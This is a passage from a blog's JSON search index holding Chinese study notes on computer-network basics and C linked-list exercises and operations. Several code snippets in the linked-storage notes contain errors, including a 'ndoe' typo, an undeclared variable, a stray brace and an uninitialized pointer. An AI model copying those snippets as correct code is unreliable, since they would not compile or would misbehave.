users;","categories":[{"name":"WEB漏洞详解","slug":"WEB漏洞详解","permalink":"https://xizhi-future.github.io/categories/WEB%E6%BC%8F%E6%B4%9E%E8%AF%A6%E8%A7%A3/"}],"tags":[{"name":"漏洞","slug":"漏洞","permalink":"https://xizhi-future.github.io/tags/%E6%BC%8F%E6%B4%9E/"},{"name":"SQL注入","slug":"SQL注入","permalink":"https://xizhi-future.github.io/tags/SQL%E6%B3%A8%E5%85%A5/"}],"author":"xizhi-future"},{"title":"计算机网络概念、发展、性能","slug":"计算机网络概念、发展、性能","date":"2021-10-07T10:05:01.000Z","updated":"2021-10-07T10:05:55.993Z","comments":true,"path":"2021/10/07/计算机网络概念、发展、性能/","link":"","permalink":"https://xizhi-future.github.io/2021/10/07/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E6%A6%82%E5%BF%B5%E3%80%81%E5%8F%91%E5%B1%95%E3%80%81%E6%80%A7%E8%83%BD/","excerpt":"","text":"1.1 计算机网络在信息时代的作用21世纪，数字化、网络化、信息化 网络化：三网——-电信网络、计算机网络、有线电视网络 计算机网络：因特网、其它网络（政府专用网络等等） 计算机网络的重要功能： 连通性：彼此连接，交换信息 共享：信息共享、软硬件共享 1.2 因特网网络：Network 结点（交换机 和 计算机） 与 链路 连接，许多计算机 通过 链路 连接在交换机上，之间的—— 交换机 互连网：internet （Network of Networks） 连接 各个网络，网络与网络 通过路由器 相连 ——- 路由器 因特网：Internet 全球最大的互连网 TCP/IP 因特网发展三个阶段： ARPANET 向互连网 发展： 1969 年，分组交换 1975 年，互联网 1983 年，因特网 TCP/IP，此时 是未开放的政府性质的网络 三级结构的因特网 1985 年，三个地区网（校园网等），一个主干网，地区网连接在主干网上 多层次 ISP 结构的因特网 （ISP 因特网服务提供商：端系统通过其连接在因特网） 由因特网管理机构 分配公网 IP 给 ISP ，然后 ISP 再分配给 端系统，同时 ISP 也是分级的 选择本地运营商下载速度快 1.3 因特网的组成1.3.1 核心部分数据交换方式： 电路交换 Circuit Switching ：面向连接 举例：打电话 建立连接：申请占用通信资源（耗时） 通话过程：一直占用资源 释放连接：释放通信资源（不释放即为 占线） 适用于：数据量很大的实时性传输；核心路由器之间可使用。 报文交换 Message Switching 报文比分组长（不分段） 报文交换的时间长 不建立连接 分组交换 Packet Switching：计算机网络采用该方式实现数据通信 发送端将需要传输的数据进行分组：每一个分组均由 首部（源地址、目标地址） 和 数据 两部分组成 接收端 接收每个分组，去掉其首部保留数据，连接在一起，使数据完整 从发送端到接收端：进行分组的转发——由路由器进行选择最佳合适的路径进行转发 （路由器：存储、转发的功能 暂存、查找转发表、找到要转发的端口） 不需要建立连接，不占线 优点：高效、迅速、可靠、灵活 缺点：时延、开销 耗时：报文 &gt; 电路 &gt; 分组 1.3.2 边缘部分主机之间的通信方式： C/S 客户服务器方式：Client/Server 服务器是服务器，客户机是客户机 P2P 对等方式：Peer-to-Peer 客户机也可以是服务器，即是服务器也是客户机 例如：P2P 下载：可以从多个源上下载同一个文件，不需要仅仅从一个服务器上下载 1.4 计算机网络在我国的发展1994 年 4 月 20 日，中国正式接入互连网 1.5 计算机网络的类别 1.6 计算机网络的性能速率：连接在计算机网络上的主机在数字信道上传送 数据位数 的速率 data rate bit rate b/s kb/s Mb/s Gb/s 带宽：数据通信领域中，数字信道所能传送的最高数据率 b/s kb/s Mb/s Gb/s 吞吐量：单位时间内通过某个网络（所有路径）的数据量 b/s Mb/s 时延：发送时延、传播时延、处理时延、排队时延之和 时延带宽积：传播时延 x 带宽 往返时间：从发送端发送数据开始，到发送端收到接收端确认 为止 利用率 信道利用率：有数据通过时间/（有加无）数据通过的时间 网络利用率：信道利用率加权平均值 非性能指标： 费用 、管理与维护、质量、标准化、可靠性、可扩展性、可升级性","categories":[{"name":"计网","slug":"计网","permalink":"https://xizhi-future.github.io/categories/%E8%AE%A1%E7%BD%91/"}],"tags":[{"name":"计网","slug":"计网","permalink":"https://xizhi-future.github.io/tags/%E8%AE%A1%E7%BD%91/"}],"author":"xizhi-future"},{"title":"单链表、双链表练题","slug":"单链表、双链表练题","date":"2021-10-05T11:51:44.000Z","updated":"2021-10-05T11:52:52.560Z","comments":true,"path":"2021/10/05/单链表、双链表练题/","link":"","permalink":"https://xizhi-future.github.io/2021/10/05/%E5%8D%95%E9%93%BE%E8%A1%A8%E3%80%81%E5%8F%8C%E9%93%BE%E8%A1%A8%E7%BB%83%E9%A2%98/","excerpt":"","text":"[TOC] 第三章 链式存储1. 设计一个算法，求一个单链表中的结点个数。算法： 12345678910//计数int count(node *head)&#123; int s = 0; node *p = head; while(p)&#123; p = p-&gt;next; s++; &#125; return s;&#125; 测试： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657#include&lt;stdio.h&gt;#include&lt;stdlib.h&gt;#define FLAG 0typedef int datatype;typedef struct link_node&#123; datatype info; struct link_node *next;&#125;node;//前插法 创建单链表node *creat()&#123; node *head = NULL; node *s; int x; printf(&quot;请输入结点值：\\n&quot;); scanf(&quot;%d&quot;,&amp;x); while( x!= FLAG)&#123; s = (node*)malloc(sizeof(node)); s-&gt;info = x; s-&gt;next = head; head = s; scanf(&quot;%d&quot;,&amp;x); &#125; return head;&#125;//输出void print(node *head)&#123; node *p = head; if(!p) &#123;printf(&quot;链表是 空的！\\n&quot;);&#125; else&#123; printf(&quot;单链表各个结点的值是：\\n&quot;); while(p)&#123; printf(&quot;%5d&quot;,p-&gt;info); p = p-&gt;next; &#125; &#125;&#125;//计数int count(node *head)&#123; int s = 0; node *p = head; while(p)&#123; p = p-&gt;next; s++; &#125; return s;&#125;int main()&#123; node *pt; int sum; pt=creat(); print(pt); sum = count(pt); printf(&quot;\\n\\n该单链表中结点个数是：%d\\n&quot;,sum); return 0;&#125; 2. 设计一个算法，在一个单链表中值为y的结点前面插入一个值为x的结点。即使值为x的新结点成为值为y的结点的前驱结点。算法： 1234567891011121314151617//在值为 y 的结点前插入 值为 x 的结点node *insert(node *head,datatype y,datatype x)&#123; node *p = head; node *q,*pre; while(p &amp;&amp; p-&gt;info != y)&#123; pre = p; p = p-&gt;next; &#125; if(!p) &#123;printf(&quot;找不到值是%d的结点\\n&quot;,y);&#125; else&#123; q = (node*)malloc(sizeof(node)); q-&gt;info = x; q-&gt;next = p; pre-&gt;next = q; &#125; return head;&#125; 测试： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667#include&lt;stdio.h&gt;#include&lt;stdlib.h&gt;#define FLAG 0typedef int datatype;typedef struct link_node&#123; datatype info; struct link_node *next;&#125;node;//创建单链表 前插法node *creat(void)&#123; node *head = NULL; node *s; int x; printf(&quot;请输入结点值：\\n&quot;); scanf(&quot;%d&quot;,&amp;x); while(x != FLAG)&#123; s = (node*)malloc(sizeof(node)); s-&gt;info = x; s-&gt;next = head; head = s; scanf(&quot;%d&quot;,&amp;x); &#125; return head;&#125;//输出void print(node *head)&#123; //由于是 前插：所以输出的内容是与之前输入的顺序相反 node *p = head; if(!p) &#123;printf(&quot;单链表是空的！\\n&quot;);&#125; else&#123; printf(&quot;单链表各个结点的值是：\\n&quot;); while(p)&#123; printf(&quot;%5d&quot;,p-&gt;info); p = p-&gt;next; &#125; &#125;&#125;//在值为 y 的结点前插入 值为 x 的结点node *insert(node *head,datatype y,datatype x)&#123; node *p = head; node *q,*pre; while(p &amp;&amp; p-&gt;info != y)&#123; pre = p; p = p-&gt;next; &#125; if(!p) &#123;printf(&quot;找不到值是%d的结点\\n&quot;,y);&#125; else&#123; q = (node*)malloc(sizeof(node)); q-&gt;info = x; q-&gt;next = p; pre-&gt;next = q; &#125; return head;&#125;int main()&#123; node *pt; pt = creat(); printf(&quot;进行插入之前：\\n&quot;); print(pt); pt = insert(pt,11,88); printf(&quot;\\n进行插入之后：\\n&quot;); print(pt); printf(&quot;\\n&quot;); return 0;&#125; 3. 设计一个算法，判断一个单链表中各个结点值是否有序。算法： 1234567891011121314151617181920212223242526//判断 单链表中 各结点值是否有序//参数是 a ，为升序，参数为 b ，为降序int judge_order(node *head,char c)&#123; int flag = 1; //node *p = head-&gt;next; node *p = head; switch(c)&#123; case &#x27;a&#x27;: while(p &amp;&amp; p-&gt;next &amp;&amp; flag)&#123; if(p-&gt;info &lt;= p-&gt;next-&gt;info) p = p-&gt;next; else flag = 0; &#125; break; case &#x27;b&#x27;: while(p &amp;&amp; p-&gt;next &amp;&amp; flag)&#123; if(p-&gt;info &gt;= p-&gt;next-&gt;info) p = p-&gt;next; else flag = 0; &#125; break; &#125; return flag;&#125; 测试： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112#include&lt;stdio.h&gt;#include&lt;stdlib.h&gt;#define FLAG 0typedef int datatype;typedef struct link_node&#123; datatype info; struct link_node *next;&#125;node;/*//创建单链表 前插法node *creat_first(void)&#123; node *head = NULL; node *s; int x; printf(&quot;请输入各个结点的值：\\n&quot;); scanf(&quot;%d&quot;,&amp;x); while(x != FLAG)&#123; s = (node*)malloc(sizeof(node)); s-&gt;info = x; s-&gt;next = head; head = s; scanf(&quot;%d&quot;,&amp;x); &#125; return head;&#125;*///后插法 创建单链表node *creat_behind(void)&#123; node *head = NULL; node *r = NULL; node *s; int x; printf(&quot;请输出各个结点的值：\\n&quot;); scanf(&quot;%d&quot;,&amp;x); while(x != FLAG)&#123; s = (node*)malloc(sizeof(node)); s-&gt;info = x; if(!head) head = s; else r-&gt;next = s; r = s; scanf(&quot;%d&quot;,&amp;x); &#125; if(r != NULL)&#123; r-&gt;next = NULL; &#125; return head;&#125;//输出void print(node *head)&#123; node *p = head; if(!p) &#123;printf(&quot;单链表是空的!\\n&quot;);&#125; else&#123; printf(&quot;单链表各个结点的值是：\\n&quot;); while(p)&#123; printf(&quot;%5d&quot;,p-&gt;info); p = p-&gt;next; &#125; &#125;&#125;//判断 单链表中 各结点值是否有序//参数是 a ，为升序，参数为 b ，为降序int judge_order(node *head,char c)&#123; int flag = 1; //node *p = head-&gt;next; node *p = head; switch(c)&#123; case &#x27;a&#x27;: while(p &amp;&amp; p-&gt;next &amp;&amp; flag)&#123; if(p-&gt;info &lt;= p-&gt;next-&gt;info) p = p-&gt;next; else flag = 0; &#125; break; case &#x27;b&#x27;: while(p &amp;&amp; p-&gt;next &amp;&amp; flag)&#123; if(p-&gt;info &gt;= p-&gt;next-&gt;info) p = p-&gt;next; else flag = 0; &#125; break; &#125; return flag;&#125;int main()&#123; node *pt; int i = 0; //pt = creat_first(); while(i &lt;=3)&#123; pt = creat_behind(); print(pt); if(judge_order(pt,&#x27;a&#x27;))&#123; printf(&quot;\\n单链表是 升序 排列的！\\n&quot;); &#125; else if(judge_order(pt,&#x27;b&#x27;))&#123; printf(&quot;\\n单链表是 降序 排列的！\\n&quot;); &#125;else&#123; printf(&quot;\\n单链表是 无序 排列的！\\n\\n\\n&quot;); &#125; i++; &#125; return 0;&#125; 4. 设计一个算法，利用单链表原来的结点空间将一个单链表就地转置。算法： 123456789101112//转置void reverse(node *head)&#123; node *p,*q; p = head-&gt;next; head-&gt;next = NULL; while(p)&#123; q = p; p = p-&gt;next; q-&gt;next = head-&gt;next; head-&gt;next = q; &#125; &#125; 测试： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768#include&lt;stdio.h&gt;#include&lt;stdlib.h&gt;#define FLAG 0typedef int datatype;typedef struct link_node&#123; datatype info; struct link_node *next;&#125;node;//后插法 创建 带头结点的 单链表node *creat_behind()&#123; node *head,*s,*r; datatype x; head = r = (node*)malloc(sizeof(node)); printf(&quot;请输入单链表内容：（以 0 结尾）\\n&quot;); scanf(&quot;%d&quot;,&amp;x); while(x)&#123; s = (node*)malloc(sizeof(node)); s-&gt;info = x; r-&gt;next = s; r = s; scanf(&quot;%d&quot;,&amp;x); &#125; r-&gt;next = NULL; return head;&#125;//打印输出 带头结点的单链表void print(node *head)&#123; node *p; p = head-&gt;next; if(!p)&#123; printf(&quot;单链表是空的！\\n&quot;); &#125;else&#123; printf(&quot;单链表中各个结点的值是：\\n&quot;); while(p)&#123; printf(&quot;%5d&quot;,p-&gt;info); p = p-&gt;next; &#125; &#125; printf(&quot;\\n&quot;);&#125;//转置void reverse(node *head)&#123; node *p,*q; p = head-&gt;next; head-&gt;next = NULL; while(p)&#123; q = p; p = p-&gt;next; q-&gt;next = head-&gt;next; head-&gt;next = q; &#125; &#125;int main()&#123; node *pt; pt = creat_behind(); printf(&quot;\\n&quot;); printf(&quot;原单链表：\\n&quot;); print(pt); reverse(pt); //转置 printf(&quot;转置之后的单链表：\\n&quot;); printf(&quot;\\n&quot;); print(pt); printf(&quot;\\n&quot;); return 0;&#125; 5. 设计一个算法，在双链表中值为y的结点前面插入一个值为x的新结点。即使值为x的新结点成为值为y的结点的前驱结点。算法： 1234567891011121314151617181920//在值为 y 的结点之前插入 值为 x 的新的结点dnode *insert(dnode *head,datatype y,datatype x)&#123; dnode *p = head-&gt;rlink; dnode *s; while(p &amp;&amp; p-&gt;info != y)&#123; p = p-&gt;rlink; &#125; if(!p)&#123; printf(&quot;\\n双链表中不存在值为 y 的结点，无法插入！\\n&quot;); &#125;else&#123; // 进行插入 ：在值为 y 的结点之前插入 值为 x 的新的结点 s = (dnode*)malloc(sizeof(dnode)); s-&gt;info = x; s-&gt;rlink = p; p-&gt;llink-&gt;rlink = s; s-&gt;llink = p-&gt;llink; p-&gt;llink = s; &#125; return head;&#125; 测试： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374#include&lt;stdio.h&gt;#include&lt;stdlib.h&gt;typedef int datatype;typedef struct dlink_node&#123; datatype info; struct dlink_node *rlink,*llink;&#125;dnode;//尾插法 创建带头结点的双链表dnode *creat_behind(void)&#123; dnode *head,*r,*s; //注意：同时定义多个指针 datatype x; head = r = (dnode*)malloc(sizeof(dnode));//建立双链表的头结点 head-&gt;llink = head-&gt;rlink = NULL; printf(&quot;请输出双链表的内容：(以 0 结束)\\n&quot;); scanf(&quot;%d&quot;,&amp;x); while(x)&#123; s = (dnode*)malloc(sizeof(dnode)); s-&gt;info = x; s-&gt;rlink = r-&gt;rlink; //将新的结点 s 插入到双链表的末尾 s-&gt;llink = r; r-&gt;rlink = s; r = s; scanf(&quot;%d&quot;,&amp;x); &#125; return head;&#125;//打印输出void print(dnode *head)&#123; dnode *p; p = head-&gt;rlink; //由于是带头结点的 所以 指向 head 的 下一个位置 if(!p)&#123; printf(&quot;双链表是空的！\\n&quot;); &#125;else&#123; printf(&quot;单链表中各个结点的值是：\\n&quot;); while(p)&#123; printf(&quot;%5d&quot;,p-&gt;info); p = p-&gt;rlink; &#125; &#125;&#125;//在值为 y 的结点之前插入 值为 x 的新的结点dnode *insert(dnode *head,datatype y,datatype x)&#123; dnode *p = head-&gt;rlink; dnode *s; while(p &amp;&amp; p-&gt;info != y)&#123; p = p-&gt;rlink; &#125; if(!p)&#123; printf(&quot;\\n双链表中不存在值为 y 的结点，无法插入！\\n&quot;); &#125;else&#123; // 进行插入 ：在值为 y 的结点之前插入 值为 x 的新的结点 s = (dnode*)malloc(sizeof(dnode)); s-&gt;info = x; s-&gt;rlink = p; p-&gt;llink-&gt;rlink = s; s-&gt;llink = p-&gt;llink; p-&gt;llink = s; &#125; return head;&#125;int main()&#123; dnode *pt,*pt1; pt = creat_behind(); printf(&quot;\\n进行操作之前：\\n&quot;); print(pt); pt1 = insert(pt,10,99); //在 10 前面插入 99 printf(&quot;\\n进行操作之后：\\n&quot;); print(pt1); printf(&quot;\\n&quot;); return 0;&#125; 6. 设计一个算法，从右向左打印一个双链表中各个结点的值。算法： 12345678//从右向左打印一个双链表中各个结点的值//递归法void print_reverse(dnode *head)&#123; if(head-&gt;rlink)&#123; print_reverse(head-&gt;rlink); printf(&quot;%5d&quot;,head-&gt;rlink-&gt;info); &#125;&#125; 测试： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263#include&lt;stdio.h&gt;#include&lt;stdlib.h&gt;typedef int datatype;typedef struct dlink_node&#123; datatype info; struct dlink_node *rlink,*llink;&#125;dnode;//尾插法 创建 带头结点的 双链表dnode *creat_behind(void)&#123; dnode *head,*r,*s; datatype x; head = r = (dnode*)malloc(sizeof(dnode)); head-&gt;llink = head-&gt;rlink = NULL; printf(&quot;请输入双链表的内容：（以 0 结束）\\n&quot;); scanf(&quot;%d&quot;,&amp;x); while(x)&#123; s = (dnode*)malloc(sizeof(dnode)); s-&gt;info = x; s-&gt;rlink = r-&gt;rlink; s-&gt;llink = r; r-&gt;rlink = s; r = s; scanf(&quot;%d&quot;,&amp;x); &#125; return head;&#125;//打印输出void print(dnode *head)&#123; dnode *p; p = head-&gt;rlink; if(!p)&#123; printf(&quot;双链表是空的！\\n&quot;); &#125;else&#123; printf(&quot;双链表的各个值是：\\n&quot;); while(p)&#123; printf(&quot;%5d&quot;,p-&gt;info); p = p-&gt;rlink; &#125; &#125;&#125;//从右向左打印一个双链表中各个结点的值//递归法void print_reverse(dnode *head)&#123; if(head-&gt;rlink)&#123; print_reverse(head-&gt;rlink); printf(&quot;%5d&quot;,head-&gt;rlink-&gt;info); &#125;&#125;int main()&#123; dnode *pt; pt = creat_behind(); printf(&quot;进行操作之前：\\n&quot;); print(pt); printf(&quot;\\n&quot;); printf(&quot;进行操作之后：\\n&quot;); print_reverse(pt); //print(pt); printf(&quot;\\n&quot;); return 0;&#125;","categories":[{"name":"数据结构","slug":"数据结构","permalink":"https://xizhi-future.github.io/categories/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/"}],"tags":[{"name":"链式存储","slug":"链式存储","permalink":"https://xizhi-future.github.io/tags/%E9%93%BE%E5%BC%8F%E5%AD%98%E5%82%A8/"}],"author":"xizhi-future"},{"title":"线性表的链式存储","slug":"线性表的链式存储","date":"2021-10-05T11:49:33.000Z","updated":"2021-10-07T09:32:38.385Z","comments":true,"path":"2021/10/05/线性表的链式存储/","link":"","permalink":"https://xizhi-future.github.io/2021/10/05/%E7%BA%BF%E6%80%A7%E8%A1%A8%E7%9A%84%E9%93%BE%E5%BC%8F%E5%AD%98%E5%82%A8/","excerpt":"","text":"[TOC] 线性表的链式存储线性表的存储方式：顺序存储 、链式存储 单链表 带头结点的单链表 循环单链表 双链表 特殊的线性表–栈和队列 的 链式存储实现 链式存储：指针 体现结点之间的逻辑关系 info next 单链表结点包含 两个域：info域 next 指针域 必须含有一个首指针 指向单链表中的第一个结点 head 单链表的创建前插法： 12345678910111213141516//创建单链表 前插法node *creat_first(void)&#123; node *head = NULL; node *s; int x; printf(&quot;请输入各个结点的值：\\n&quot;); scanf(&quot;%d&quot;,&amp;x); while(x != FLAG)&#123; s = (node*)malloc(sizeof(node)); s-&gt;info = x; s-&gt;next = head; head = s; scanf(&quot;%d&quot;,&amp;x); &#125; return head;&#125; 尾插法： 1234567891011121314151617181920212223//后插法 创建单链表node *creat_behind(void)&#123; node *head = NULL; node *r = NULL; node *s; int x; printf(&quot;请输出各个结点的值：\\n&quot;); scanf(&quot;%d&quot;,&amp;x); while(x != FLAG)&#123; s = (node*)malloc(sizeof(node)); s-&gt;info = x; if(!head) head = s; else r-&gt;next = s; r = s; scanf(&quot;%d&quot;,&amp;x); &#125; if(r != NULL)&#123; r-&gt;next = NULL; &#125; return head;&#125; 单链表的操作12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091929394959697#include&lt;stdio.h&gt;typedef int datatype;typedef struct link_node&#123; datatype info; struct link_node *next;&#125;node;//建立一个空的链表node *init()&#123; return NULL;&#125;//输出void print(node *head)&#123; node *p; p = head; if(!p) printf(&quot;单链表是空的！&quot;); else &#123; printf(&quot;\\n单链表各个结点的值是：\\n&quot;); while(p)&#123; printf(&quot;%5d&quot;,p-&gt;info); p = p-&gt;next; &#125; &#125;&#125;//查找值是 x 的结点node *find_x(node *head,datatype x)&#123; node *p; p = head; while(p &amp;&amp; p-&gt;info != x) p = p-&gt;next; return p;&#125;//查找 第 i 个结点node *find_i(node *head,int i)&#123; int j = 1; node *p = head; if(i &lt; 1) &#123;printf(&quot;\\nError!&quot;);return NULL;&#125; while(p &amp;&amp; i!=j) &#123;p = p-&gt;next;j++;&#125; return p;&#125;//插入 值为 x 的结点作为单链表的第一个结点 node *insert_begin(node *head,datatype x)&#123; node *p; p = (node*)malloc(sizeof(node)); p-&gt;info = x; p-&gt;next = head; head = p; //p 现在是第一个结点，头 head 换成 p return head;&#125;//在单链表 第 i 个结点之后插入一个值为 x 的结点node *insert_medium(node *head,datatype x,int i)&#123; node *p,*q; q = find_i(head,i);//查找第 i 个结点 if(!q) &#123;printf(&quot;找不到第 i 个结点，不能进行插入！&quot;);exit(1);&#125; p = (node*)malloc(sizeof(node)); p-&gt;info = x; p-&gt;next = q-&gt;next; q-&gt;next = p; return head;&#125;//在单链表最后位置插入结点 xnode *insert_last(node *head,datatype x)&#123; node *p = head; node *q; q = (node*)malloc(sizeof(node)); q-&gt;info = x; while(p-&gt;next)&#123; //找到最后一个结点的位置，最后一个结点的 next 是 NULL p = p-&gt;next; &#125; p-&gt;next = q; q-&gt;next = NULL; return head;&#125;//删除单链表 结点node *delete_begin(node *head,datatype x)&#123; node *pre = NULL,*p; if(!head)&#123; printf(&quot;单链表是空的！&quot;);exit(1); return head; &#125; p = head; while(p &amp;&amp; p-&gt;info != x)&#123; //如果删除的是中间的 用 pre 指向 p 原本的位置 pre = p; p = p-&gt;next; &#125; if(!pre &amp;&amp; p-&gt;info == x)&#123; //需要删除的是 第一个 结点 head = head-&gt;next; &#125;else&#123; pre-&gt;next = p-&gt;next; //需要删除的是 中间的 结点 &#125; free(p); return head;&#125; 链式存储 的插入与删除 比 顺序表方便，但不能随机去访问 某个结点 插入判满，删除判空！！！！！！！1 带头结点的单链表 带头结点的单链表创建1234567891011121314151617//后插法 创建 带头结点的 单链表node *creat_behind()&#123; node *head,*s,*r; datatype x; head = r = (node*)malloc(sizeof(node)); printf(&quot;请输入单链表内容：（以 0 结尾）\\n&quot;); scanf(&quot;%d&quot;,&amp;x); while(x)&#123; s = (node*)malloc(sizeof(node)); s-&gt;info = x; r-&gt;next = s; r = s; scanf(&quot;%d&quot;,&amp;x); &#125; r-&gt;next = NULL; return head;&#125; 带头结点的单链表操作1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465//初始化node *init()&#123; node *head; head = (node*)malloc(sizeof(node)); head-&gt;next = NULL; return head;&#125;//打印输出 带头结点的单链表void print(node *head)&#123; node *p; p = head-&gt;next; if(!p)&#123; printf(&quot;单链表是空的！\\n&quot;); &#125;else&#123; printf(&quot;单链表中各个结点的值是：\\n&quot;); while(p)&#123; printf(&quot;%5d&quot;,p-&gt;info); p = p-&gt;next; &#125; &#125; printf(&quot;\\n&quot;);&#125;//查找第 i 个结点node *find_i(node *head,int i)&#123; int j = 0; node *p = head; if(i &lt; 0) &#123;printf(&quot;不存在第 %d 个结点！\\n&quot;,i); return NULL;&#125; else if(i==0) //刚好为头结点 由于是带头结点的单链表，则为 NULL return p; while(p &amp;&amp; i!=j)&#123; p = p-&gt;next; j++; &#125; return p;&#125;//插入操作 在 第 i 个 结点之后插入 xnode *insert(node *head,datatype x,int i)&#123; node *p,*q; q = find_i(head,i); if(!q) &#123;printf(&quot;不存在第 %d 个结点！\\n&quot;,i); return head;&#125; p = (node*)malloc(sizeof(node)); p-&gt;info = x; p-&gt;next = q-&gt;next; q-&gt;next = p; return head;&#125;//删除操作node *delete(node *head,datatype x)&#123; ndoe *pre = head,*q; q = head-&gt;next; //由于是带头结点 while(q &amp;&amp; q-&gt;info != x)&#123; pre = q; //使 pre 始终指向 p 的前驱 q = q-&gt;next; &#125; if(q)&#123; pre-&gt;next = q-&gt;next; //删除 free(q); //释放空间 &#125; return head;&#125; 循环单链表如果仅仅是单链表的话，它只能从首指针开始，依次向后访问，而不能访问到它前面的结点，如果想要访问到任意的结点的话——&gt;循环单链表。 做法：设置表最后一个结点的指针域指向表中的第一个结点。 假设最后一个结点的位置是 p ，则 p-&gt;next = head; 循环单链表的操作123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125//初始化node *init()&#123; return NULL;&#125;//获得 循环单链表 最后一个结点的 存储地址node *rear(node *head)&#123; node *p; if(!head) p = NULL; //循环单链表 为空 else&#123; p = head; while(p-&gt;next != head) p = p-&gt;next; &#125; return p;&#125;//打印输出void print(node *head)&#123; node *p; if(!head) printf(&quot;循环单链表是空的！\\n&quot;); else&#123; printf(&quot;循环单链表中各个结点的值是：\\n&quot;); printf(&quot;%5d&quot;,p-&gt;info); //输出非空表中的 第一个 结点的值 p = head-&gt;next; //使 p 指向第一个结点的下一个结点 while(p != head)&#123; //输出中间的结点值，直到回到第一个结点 printf(&quot;%5d&quot;,p-&gt;info); p = p-&gt;next; &#125; &#125;&#125;//查找 值 是 x 的结点node *find_x(ndoe *head,datatype x)&#123; node *p; if(!head) &#123;printf(&quot;循环单链表是 空的 ！\\n&quot;); return NULL;&#125; q = head; while(q-&gt;next != head &amp;&amp; q-&gt;info != x)&#123; q = q-&gt;next; &#125; if(q-&gt;info == x) return q; else return NULL;&#125;//插入操作node *insert(node *head,datatype x,int i)&#123; node *p,*q,*myrear; int j; p = (node*)malloc(sizeof(node)); p-&gt;info = x; if(i&lt;0)&#123; printf(&quot;找不到指定位置！\\n&quot;);&#125; free(p); return head; &#125; if(i == 0 &amp;&amp; !head)&#123; //插入之前循环单链表是空的，则插入后指针应指向自己 p-&gt;next = p; head = p; return head; &#125; if(i == 0 &amp;&amp; head)&#123; //在非空的 循环单链表中 插入 到 最前面 myrear = rear(head); //寻找 最后一个结点 p-&gt;next = head; //将 p 作为 最后一个结点 myrear-&gt;next = p; return head; &#125; if(i&gt;0 &amp;&amp; !head)&#123; printf(&quot;无法找到指定位置插入!\\n&quot;); free(p); return head; &#125; if(i&gt;0 &amp;&amp; head)&#123; //在非空的 循环单链表中 插入 位置任意 q = head; j = 1; while(i != j &amp;&amp; q-&gt;next != head)&#123; q = q-&gt;next; j++; &#125; if(i != j)&#123; printf(&quot;不存在第 %d 个结点，无法插入！&quot;,i); return head; &#125;else&#123; p-&gt;next = q-&gt;next; q-&gt;next = p; return head; &#125; &#125;&#125;//删除操作 删除值是 x 的结点node *delete(node *head,datatype x)&#123; node *pre = NULL,*q; if(!head)&#123; printf(&quot;循环单链表是空的！\\n&quot;); return head; &#125; q = head; while(q-&gt;next != head &amp;&amp; q-&gt;info != x)&#123; pre = q; q = q-&gt;next; &#125; if(q-&gt;info != x)&#123; printf(&quot;没有找到指定位置！\\n&quot;); &#125;else&#123; if(q != head)&#123; pre-&gt;next = q-&gt;next; free(q); &#125;else&#123; if(head-&gt;next == head) &#123;free(q); head = NULL;&#125; else&#123; pre = head-&gt;next; while(pre-&gt;next != q) pre = pre-&gt;next; head = head-&gt;next; pre-&gt;next = head; free(q); &#125; &#125; &#125; return head;&#125; 题目：将一个 双链表 改成一个 循环 双链表1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556#include&lt;stdio.h&gt;#include&lt;stdlib.h&gt;typedef int datatype;typedef struct dlink_node&#123; datatype info; struct dlink_node *llink,*rlink;&#125;dnode;//尾插法 创建带头结点的双链表dnode *creat_behind(void)&#123; dnode *head,*r,*s; //注意：同时定义多个指针 datatype x; head = r = (dnode*)malloc(sizeof(dnode));//建立双链表的头结点 head-&gt;llink = head-&gt;rlink = NULL; printf(&quot;请输出双链表的内容：(以 0 结束)\\n&quot;); scanf(&quot;%d&quot;,&amp;x); while(x)&#123; s = (dnode*)malloc(sizeof(dnode)); s-&gt;info = x; s-&gt;rlink = r-&gt;rlink; //将新的结点 s 插入到双链表的末尾 s-&gt;llink = r; r-&gt;rlink = s; r = s; scanf(&quot;%d&quot;,&amp;x); &#125; return head;&#125;//打印输出void print(dnode *head)&#123; dnode *p; p = head-&gt;rlink; //由于是带头结点的 所以 指向 head 的 下一个位置 while(p != head)&#123; printf(&quot;%5d&quot;,p-&gt;info); p = p-&gt;rlink; &#125;&#125;//将一个 双链表 改成一个 循环 双链表void change(dnode *head)&#123; dnode *r; r = head; while(r-&gt;rlink) r = r-&gt;rlink; head-&gt;llink = r; r-&gt;rlink = head;&#125;int main()&#123; dnode *pt; pt = creat_behind(); change(pt); printf(&quot;循环双链表的内容是：\\n&quot;); print(pt); printf(&quot;\\n&quot;); return 0;&#125; 双链表为了便于知道 链表中任意一个结点的 前驱结点 和 后继结点，我们再设一个指针域来指向该节点的前驱结点，从而形成了双链表。 双链表中，其结点 含有 三个域：info llink rlink 双链表的创建1234567891011121314151617181920//尾插法 创建带头结点的双链表dnode *creat_behind(void)&#123; dnode *head,*r,*s; //注意：同时定义多个指针 datatype x; head = r = (dnode*)malloc(sizeof(dnode));//建立双链表的头结点 head-&gt;llink = head-&gt;rlink = NULL; printf(&quot;请输出双链表的内容：(以 0 结束)\\n&quot;); scanf(&quot;%d&quot;,&amp;x); while(x)&#123; s = (dnode*)malloc(sizeof(dnode)); s-&gt;info = x; s-&gt;rlink = r-&gt;rlink; //将新的结点 s 插入到双链表的末尾 s-&gt;llink = r; r-&gt;rlink = s; r = s; scanf(&quot;%d&quot;,&amp;x); &#125; return head;&#125; 双链表的操作123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100#include&lt;stdio.h&gt;typedef int datatype;typedef struct 